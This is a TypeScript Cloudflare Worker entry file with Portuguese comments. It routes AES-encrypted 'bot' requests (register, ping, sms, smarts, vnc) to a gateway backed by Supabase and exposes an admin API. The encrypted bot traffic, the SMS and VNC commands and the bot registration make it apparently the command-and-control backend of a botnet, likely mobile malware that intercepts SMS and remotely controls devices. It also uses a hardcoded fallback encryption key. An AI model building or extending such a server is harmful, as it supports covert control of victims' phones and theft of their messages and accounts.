/**
 * bot-api/index.ts
 * Entry point único do Cloudflare Worker.
 *
 * Rotas:
 *   POST /api/bot     → Gate (register / ping / sms / smarts / vnc)
 *   /api/admin/*      → admin-api router
 *   GET  / | /health  → health check
 */
import { createClient } from '@supabase/supabase-js';
import { Gate } from './gateway';
import { aesDecrypt, aesEncrypt } from './crypto';
import { handleAdminRequest } from '../admin-api/index';

/** Env bindings do Worker (vars + secrets + assets) */
export interface Env {
  SUPABASE_URL: string;
  SUPABASE_ANON_KEY: string;
  AES_KEY: string;
  ASSETS?: Fetcher;
}

export default {
  async fetch(request: Request, env: Env, ctx: ExecutionContext): Promise<Response> {
    const url = new URL(request.url);
    const path = url.pathname;

    if (request.method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: corsHeaders() });
    }

    try {
      if (path === '/api/bot' || path === '/api/bot/') {
        if (request.method !== 'POST') {
          return json({ error: 'Method not allowed' }, 405);
        }
        return await handleBotRequest(request, env, ctx);
      }

      if (path.startsWith('/api/admin')) {
        return await handleAdminRequest(request, env, ctx);
      }

      if (path === '/' || path === '/health') {
        return json({ status: 'ok', service: 'meu-painel-api' });
      }

      return json({ error: 'Not found' }, 404);
    } catch (err) {
      const message = err instanceof Error ? err.message : 'Internal error';
      console.error('[Worker]', message, err);
      return json({ error: message }, 500);
    }
  },
};

// ---------------------------------------------------------------------------
// Bot pipeline: body cifrado → decrypt → (gunzip?) → JSON → Gate → encrypt
// ---------------------------------------------------------------------------
async function handleBotRequest(
  request: Request,
  env: Env,
  _ctx: ExecutionContext
): Promise<Response> {
  const aesKey = env.AES_KEY || '60170';

  if (!env.SUPABASE_URL || !env.SUPABASE_ANON_KEY) {
    return plain('missing_supabase_env', 500);
  }

  const encryptedBody = (await request.text()).trim();
  if (!encryptedBody) {
    return plain('empty_body', 400);
  }

  // 1) AES decrypt
  let decrypted: string;
  try {
    decrypted = aesDecrypt(encryptedBody, aesKey);
  } catch (e) {
    console.error('[bot] aesDecrypt failed:', e);
    return plain('decrypt_error', 400);
  }

  // 2) JSON direto OU Base64(GZIP(JSON)) — compatível com test-bot.js
  let jsonStr = decrypted.trim();
  if (!jsonStr.startsWith('{') && !jsonStr.startsWith('[')) {
    try {
      const { gunzipSync } = await import('node:zlib');
      const gzipBuffer = Buffer.from(jsonStr, 'base64');
      jsonStr = gunzipSync(gzipBuffer).toString('utf8');
    } catch (e) {
      console.error('[bot] gunzip failed:', e);
      return plain('bad_json', 400);
    }
  }

  let data: Record<string, any>;
  try {
    data = JSON.parse(jsonStr);
  } catch (e) {
    console.error('[bot] JSON.parse failed:', e);
    return plain('bad_json', 400);
  }

  // 3) Supabase + config
  const supabase = createClient(env.SUPABASE_URL, env.SUPABASE_ANON_KEY);

  const cfg: Record<string, string> = {};
  try {
    const { data: rows } = await supabase.from('config').select('name, value');
    if (rows) {
      for (const row of rows) {
        cfg[row.name] = String(row.value ?? '');
      }
    }
  } catch (e) {
    console.warn('[bot] config load skipped:', e);
  }

  // 4) Gate (lógica unificada)
  const gate = new Gate(supabase, cfg);
  let responseText: string;
  try {
    responseText = await gate.process(data, request);
  } catch (e) {
    console.error('[bot] gate.process error:', e);
    const msg = e instanceof Error ? e.message : String(e);
    responseText = JSON.stringify({ status: 'error', message: msg });
  }

  // 5) Resposta cifrada (mesmo AES)
  let encryptedResponse: string;
  try {
    encryptedResponse = aesEncrypt(responseText, aesKey);
  } catch (e) {
    console.error('[bot] aesEncrypt failed:', e);
    return plain('encrypt_error', 500);
  }

  return new Response(encryptedResponse, {
    status: 200,
    headers: {
      'Content-Type': 'text/plain; charset=utf-8',
      ...corsHeaders(),
    },
  });
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
function corsHeaders(): HeadersInit {
  return {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers':
      'Content-Type, Authorization, HTTP_PACKETS_SENT',
  };
}

function json(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      ...corsHeaders(),
    },
  });
}

function plain(text: string, status = 200): Response {
  return new Response(text, {
    status,
    headers: {
      'Content-Type': 'text/plain; charset=utf-8',
      ...corsHeaders(),
    },
  });
}